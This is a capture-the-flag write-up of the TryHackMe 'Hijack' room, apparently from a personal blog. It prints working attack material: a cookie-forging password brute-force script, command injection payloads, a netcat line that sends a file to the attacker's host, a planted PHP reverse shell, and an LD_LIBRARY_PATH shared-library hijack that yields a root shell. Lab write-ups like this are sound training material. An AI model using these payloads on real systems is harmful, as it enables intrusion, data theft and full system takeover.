---
title: "TryHackMe - Hijack"
author: Nasrallah
description: ""
date: 2023-09-03 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, python, bruteforce, hijack, sudo, commandinjection]
img_path: /assets/img/tryhackme/hijack
image:
    path: hijack.png
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

## **Description**

[Hijack](https://tryhackme.com/room/hijack) is a box with an NFS share where we find FTP credentials. On the FTP server we find a password list that we use to brute force our way into an administration web page vulnerable to command injection, we exploit that to get a shell. Clear text credentials are found in the website's config file giving us access to a user that has sudo privilege to run apache with the `LD_LIBRARY_PATH` option, we exploit that and hijack a library to get root.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.228.30
Host is up (0.094s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
|_  256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Home
|_http-server-header: Apache/2.4.18 (Ubuntu)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      34495/udp6  mountd
|   100005  1,2,3      43525/tcp   mountd
|   100005  1,2,3      58744/udp   mountd
|   100005  1,2,3      60780/tcp6  mountd
|   100021  1,3,4      34527/udp6  nlockmgr
|   100021  1,3,4      37489/tcp6  nlockmgr
|   100021  1,3,4      38143/tcp   nlockmgr
|   100021  1,3,4      48050/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp open  nfs     2-4 (RPC #100003)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We found 5 open ports:

- 21 is FTP
- 22 is SSH
- 80 is Apache web server
- 111 is rpcbind
- 2049 is NFS

### NFS

Let's start with enumerating NFS and see if there are any shares:

```bash
showmount -e 10.10.228.30

Export list for 10.10.228.30:
/mnt/share *
```

We found the share `/mnt/share`. Let's mount it using the following command:

```bash
sudo mount -t nfs 10.10.228.30:/mnt/share /mnt/ctf -nolock
```

![Mount the share](1.png)

We managed to mount the share in our machines but couldn't access it.

When we run `ls -l` we see that the owner of the share has the uid `1003` but doesn't show the name.

Let's create a new user with the uid of `1003` using the following command:

```bash
sudo useradd dummy -u 1003
```

Now let's switch to that user with `sudo su dummy`.

```bash
┌──(sirius㉿DESKTOP-NKI7PE3)-[~/CTF/THM/hijack]
└─$ sudo su dummy
$ id
uid=1003(dummy) gid=1003(dummy) groups=1003(dummy)
```

Let's access the share now.

![Share content](2.png)

We found a text file called `for_employees.txt` and it has ftp credentials.

### FTP

Let's login to the ftp server.

![FTP content](3.png)

We found two interesting files and downloaded them. Let's see what's in them.

```text
To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
```

We found two important things here, the admin is using a password from the password list we just got, and there is a limit on the login attempts preventing brute forcing.

### Web

Let's head to the web site.

![web page](4.png)

Here we got a simple web site with a login and sign up pages, and there is an `Administration` page only an admin can access it.

Trying some passwords in the login page as user `admin` gets the admin account locked after 5 login attempts.

![locked](5.png)

Let's register and account and see if we can get anything useful.

![register account](6.png)

Now let's login with our new user and check the response in `burp`.

![login](7.png)

After a successful login we get a `302` to `index.php` and a cookie that's base64 encoded.

When decoding the cookie we see that it has the username and an md5 hash of the password.

#### Brute force

Since we know the admin is using a password from the list, we can create a script that goes through the passwords in the list -> hash them with md5 -> add the hash to the string `admin:` and base64 encode the string. Then we use that as a cookie for a get request to `index.php`.

```python
import requests
import sys
import hashlib
import base64

def generate_cookie(password):

    pass_hash = hashlib.md5(password.encode("utf-8")).hexdigest()
    creds = "admin:" + pass_hash
    cookie = base64.b64encode(creds.encode("utf-8")).decode("utf-8")
    return cookie

def login(url, pass_file):
    file = open(pass_file, "r")

    for passwords in file.readlines():

        password = passwords.strip("\n")

        cookie = generate_cookie(password)
        cookie_dict = {"PHPSESSID": cookie}

        response = requests.get(url, cookies=cookie_dict)

        if "Welcome admin" in response.text:
            print(f"(+) Password found! ====> {password}")
            sys.exit(1)



def main():
    if len(sys.argv) != 3:
        print(f"(+) Usage: python3 {sys.argv[0]} <IP> <Passwords file>")
        print(f"(+) Example: python {sys.argv[0]} 10.10.10.10 passwords.txt ")
        sys.exit(1)

    print("(+) Starting the attack..")

    ip = sys.argv[1]
    pass_file = sys.argv[2]
    url = "http://" + ip + "/index.php"

    login(url, pass_file)

if __name__ == "__main__":
    main()
```

After running the script I managed to get the admin's password.

![password](8.png)

Now let's login and go to the `Administration` page.

![Administration page](9.png)

This is a services status checker. I directly went for a command injection but it got detected.

![command injection detected](10.png)

I tried a different payload and it worked: `$(id)`

![id](11.png)

With that I tried to read the `Administration.php` file but didn't show as expected so I just copied it to my machines using the following command:

On my machine I setup a listener `nc -lvnp 1234 > administration.php`, this writes everything it get's to that file.

The command injection is `$(nc 10.9.76.240 1234 < administration.php)` which connects to my listener and feed the administration.php file to it.

```php
<?php
if (isset($_POST['submit'])) {
    $service = $_POST['service'];
    if(strpos($service, ';') !== false || strpos($service, '|') !== false){
        echo "<pre>";
        echo "<p>Command injection detected, please provide a service.</p>";
        echo "</pre>";
    }
    else {
    $cmd = shell_exec("/bin/bash /var/www/html/service_status.sh $service");

    echo "<pre>";
    echo "$cmd";
    echo "</pre>";
    }
}
?>
```

Here we can see the filter put in place. The code checks for semicolon `;` and pipe `|` in the input to determine whether it's a command injection or not. Poor and lazy filter in my opinion.

## **Foothold**

To get a shell I used the last technique to write a php reverse shell on the target.

On my machine i setup a listener and gave it the php reverse shell:

```bash
nc -lvnp 1234 < php-reverse-shell.php
```

> The reverse shell i used is `Pentest Monkey php shell`

Now on the command injection i connect to my listener and write the output to shell.php on the target.

```bash
$(nc 10.9.76.240 1234 > shell.php)
```

Now we just setup a listener and request the file.

![revshell](12.png)

## **Privilege Escalation**

### www-data -> rick

Checking the files of the website we find a config files with database credentials.

![creds](13.png)

That's rick's password used to connect to the database, let's see if he reused the password by connecting via ssh.

![ssh login](14.png)

It worked!

### rick -> root

Let's check our privileges as rick.

```bash
rick@Hijack:~$ sudo -l
[sudo] password for rick:
Matching Defaults entries for rick on Hijack:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_LIBRARY_PATH

User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

We can start an apache webserver as root.

The important thing to notice here is the `env_keep+=LD_LIBRARY_PATH` at the top.

On `HackTricks` we can find a way to exploit this option to get a root shell.

![hacktricks](15.png)

First we need to create a c file with the following code:

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Then we compile it using the following command:

```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC ./exploit.c
```

Now we run the sudo command like the following:

```bash
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

![root](16.png)

We got root!

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---
